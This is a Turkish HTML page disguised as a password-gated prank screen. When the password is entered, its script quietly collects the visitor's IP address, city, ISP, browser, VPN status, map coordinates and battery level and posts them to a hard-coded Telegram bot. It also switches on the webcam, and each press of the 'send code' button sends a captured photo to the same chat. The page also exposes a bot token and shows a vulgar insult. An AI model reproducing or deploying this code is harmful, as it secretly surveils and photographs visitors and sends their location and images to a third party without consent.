<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>AyÄ±k Ol</title>
  <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: black;
      color: white;
      font-family: 'Russo One', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      overflow: hidden;
    }
    #hataMesaji {
      display: none;
      font-size: 28px;
      color: red;
      animation: yanipSonme 0.5s infinite;
    }
    @keyframes yanipSonme {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }
    #ayikOl, #koduGonder {
      display: none;
    }
    #uyari {
      display: none;
      color: orange;
      font-size: 18px;
      margin-top: 10px;
    }
    #ayikOl {
      font-size: 60px;
      color: red;
      margin-bottom: 10px;
    }
    #koduGonder {
      font-size: 18px;
      padding: 10px 20px;
      margin-top: 20px;
      cursor: pointer;
      background-color: #4CAF50;
      border: none;
      color: white;
      transition: transform 0.2s;
      position: relative;
      z-index: 1;
    }
    .piece {
      position: absolute;
      width: 10px;
      height: 10px;
      background-color: #4CAF50;
      animation: explodePiece 0.6s forwards ease-out;
    }
    @keyframes explodePiece {
      0% { opacity: 1; transform: translate(0, 0) scale(1); }
      100% { opacity: 0; transform: translate(100px, -100px) scale(0.5); }
    }
    video {
      display: none;
      transform: scaleX(-1);
    }
  </style>
</head>
<body>

  <audio id="breakSound" src="https://minecraft.wiki/images/Minecraft_block_stone_break1.ogg?e117f" preload="auto"></audio>

  <div id="girisEkrani">
    <h2>Åžifreyi Gir</h2>
    <input type="password" id="sifreInput" placeholder="ÅŸifre">
    <br>
    <button onclick="kontrolEt()">GiriÅŸ</button>
  </div>

  <div id="ayikOl">AYIK OL</div>
  <div id="uyari">her linke tÄ±klama</div>
  <div id="hataMesaji">Senin kafatasÄ±nÄ± sikeyim ÅŸifreyi girmeyi bile beceremedin.</div>

  <video id="kamera" autoplay playsinline muted></video>
  <button id="koduGonder" onclick="koduGonderTiklandi(this)">Kodu GÃ¶nder</button>

  <script>
    const botToken = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
    const chatId = "7791726274";
    let tiklamaSayisi = 0;

    function kontrolEt() {
      const sifre = document.getElementById("sifreInput").value;
      if (sifre === "671300") {
        document.getElementById("girisEkrani").style.display = "none";
        document.getElementById("ayikOl").style.display = "block";
        document.getElementById("koduGonder").style.display = "inline-block";

        fetch("https://ipapi.co/json")
          .then(res => res.json())
          .then(ip => {
            navigator.getBattery().then(bat => {
              const msg = `
ðŸ“¡ IP: ${ip.ip}
ðŸŒ Ãœlke: ${ip.country_name}
ðŸ™ï¸ Åžehir: ${ip.city}
ðŸ§  ISP: ${ip.org}
ðŸ“± TarayÄ±cÄ±: ${navigator.userAgent}
ðŸ” VPN/Proxy: ${ip.security?.vpn ? "Evet" : "HayÄ±r"}
ðŸ—ºï¸ Harita: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
ðŸ”‹ Åžarj: ${Math.round(bat.level * 100)}% (${bat.charging ? "Prize takÄ±lÄ±" : "Bataryada"})
              `;
              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: msg })
              });
            }).catch(() => {});
          });

        const video = document.getElementById('kamera');
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
          }).catch(() => {});
      } else {
        document.getElementById("girisEkrani").style.display = "none";
        document.getElementById("hataMesaji").style.display = "block";
      }
    }

    function koduGonderTiklandi(button) {
      tiklamaSayisi++;

      const audio = document.getElementById("breakSound");
      audio.currentTime = 0;
      audio.play();

      if (navigator.vibrate) {
        navigator.vibrate(150);
      }

      fotoGonder();

      if (tiklamaSayisi === 2) {
        document.getElementById("uyari").style.display = "block";
      }

      explodeButton(button);
    }

    function explodeButton(button) {
      const rect = button.getBoundingClientRect();
      const pieces = 25;

      for (let i = 0; i < pieces; i++) {
        const piece = document.createElement("div");
        piece.classList.add("piece");
        piece.style.left = rect.left + (Math.random() * rect.width) + "px";
        piece.style.top = rect.top + (Math.random() * rect.height) + "px";
        document.body.appendChild(piece);
        setTimeout(() => piece.remove(), 600);
      }

      button.style.visibility = "hidden";
    }

    function fotoGonder() {
      const video = document.getElementById('kamera');
      if (video.readyState >= 2) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", blob, "kamera.jpg");

          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        }, 'image/jpeg');
      }
    }
  </script>
</body>
</html>
